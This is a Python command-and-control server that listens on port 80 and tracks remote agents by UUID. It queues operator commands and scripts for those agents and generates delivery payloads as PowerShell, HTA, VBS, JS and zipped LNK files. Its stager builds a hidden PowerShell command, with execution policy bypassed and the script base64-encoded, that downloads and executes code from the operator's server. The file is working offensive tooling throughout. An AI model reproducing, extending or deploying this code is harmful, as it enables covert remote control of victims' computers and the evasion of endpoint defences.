import sys
import os
import socket
import time
import shutil
import urllib.parse
import threading
import base64

if len(sys.argv) < 2:
 print("{} <http://c2-domain>".format(sys.argv[0]))
 sys.exit(0)
url = sys.argv[1]

agentsconnected = []
agents_commands = {}
currentagent = ""

help_menu = """generate <stager/ps/hta/vbs/js/lnk> - generate payload
agents - list active agents
command <uuid> <command> - send command to agent
script <uuid> <file path> - send script to agent
refresh - refresh agents and commands
exit - exit c2
"""

def gen_ps():
 with open("bins/stub.ps1", "r") as file:
  paypay = file.read().replace("{$C2}", '{}'.format(url))
  paypay = paypay.replace("\r", "")
  paypay = paypay.replace("\n", "")
  paypayorig = paypay
  paypay = base64.b64encode(paypay.encode('utf-16-le')).decode()
  return "cmd.exe /c start powershell.exe -nop -Windowstyle hidden -ep bypass -enc {}".format(paypay)

def gen_stager(): 
 paypay = "iwr {}stage | iex".format(url)
 paypay = base64.b64encode(paypay.encode('utf-16-le')).decode()
 return "cmd.exe /c start powershell.exe -nop -Windowstyle hidden -ep bypass -enc {}".format(paypay)

def do_stager(s, addr):
 response = "HTTP/1.1 200 OK\r\nServer: Dollar\r\n\r\n"
 response += gen_ps()
 s.send(response.encode())
 s.close()

def chan_handler(s, addr):
 try:
  global agentsconnected, agents_commands
  request = s.recv(100000).decode()
  #print(request)
  if request.startswith("GET /stage "):
   do_stager(s, addr)
   return
  uuid = request.split("?q=")[1].split()[0]
  if not uuid in agentsconnected:
   with threading.Lock(): agentsconnected.append(uuid)
  requestbody = request.split("\r\n\r\n")[1]
  if "chcmd=" in requestbody: requestbody = requestbody.split("chcmd=")[1]
  requestbody = urllib.parse.unquote_plus(requestbody)
  if requestbody != "": 
   print("Received data from {}: {}".format(uuid, requestbody))
  response = "HTTP/1.1 200 OK\r\nServer: Dollar\r\n\r\n"
  if request.startswith("GET"):
   if uuid in agents_commands:
    #print("Sending command {} to {}".format(agents_commands[uuid], uuid))
    response += agents_commands[uuid]
    del agents_commands[uuid]
  s.send(response.encode())
  s.close() 
 except Exception as error:
  pass

def chan():
 try:
  print("Starting chan...")
  s = socket.socket()
  s.bind(("0.0.0.0", 80))
  s.listen(10000)
  while 1:
   snew,saddr = s.accept()
   t=threading.Thread(target=chan_handler, args=(snew,saddr))
   t.start()
 except Exception as error:
  print(error)
  os._exit(-1)

def gen_hta():
 with open("bins/stub.hta", "r") as file:
  paypay = file.read().replace("{ACOMMAND}", '{}'.format(gen_stager()))
  print()
  print(paypay)
  print()

def gen_js():
 with open("bins/stub.js", "r") as file:
  paypay = file.read().replace("{ACOMMAND}", '{}'.format(gen_stager()))
  print()
  print(paypay)
  print()

def gen_vbs():
 with open("bins/stub.vbs", "r") as file:
  paypay = file.read().replace("{ACOMMAND}", '{}'.format(gen_stager()))
  print()
  print(paypay)
  print()

def gen_lnk():
 with open("bins/shcut.ps1", "r") as file:
  data = file.read()
  data = data.replace('{COMMAND}', gen_stager())
  encscript = base64.b64encode(data.encode('utf-16-le')).decode()
  os.system("powershell -enc {}".format(encscript))
  shutil.make_archive("readypayload", "zip", "lnkdir")
  os.system("move readypayload.zip built/readypayload.zip")
  os.remove("lnkdir/Link.lnk")

def generate_payload(argz):
 format = argz
 if format == "ps":
  print()
  print(gen_ps())
  print()
 elif format == "hta":
  gen_hta()
 elif format == "vbs":
  gen_vbs()
 elif format == "js":
  gen_js()
 elif format == "stager":
  print()
  print(gen_stager())
  print()
 elif format == "lnk":
  gen_lnk()  
  print()
  print("Generated zip file in built/readypayload.zip")
  print()
  
def parse_cmd(cmd):
 global agents_commands, agentsconnected
 if cmd.startswith("help"):
  print(help_menu)
 elif cmd.startswith("generate "):
  generate_payload(cmd.split("generate ")[1])
 elif cmd.startswith("agents"):
  print("\n".join(agentsconnected))
 elif cmd.startswith("command "):
  agent = cmd.split("command ")[1].split()[0]
  command = " ".join(cmd.split()[2:])
  print("Setting command for {} -> {}".format(agent, command))
  agents_commands[agent] = command
 elif cmd.startswith("script "):
  cmd = cmd.split(" ")
  agent = cmd[1]
  with open(cmd[2], "rb") as file:
   agents_commands[agent] = file.read().decode()
  print("Script set for {}".format(agent))
 elif cmd.startswith("refresh"):
  agents_commands = {}
  agentsconnected = []
 elif cmd.startswith("exit"):
  os._exit(0)

def main(): 
 t=threading.Thread(target=chan)
 t.start()
 time.sleep(0.1)
 while 1:
  cmd = input("nobody@localhost: ")
  try:
   parse_cmd(cmd)
  except Exception as error:
   print("There was an error in your command type help for help menu")
   print(error)
  
if __name__ == "__main__": 
 main()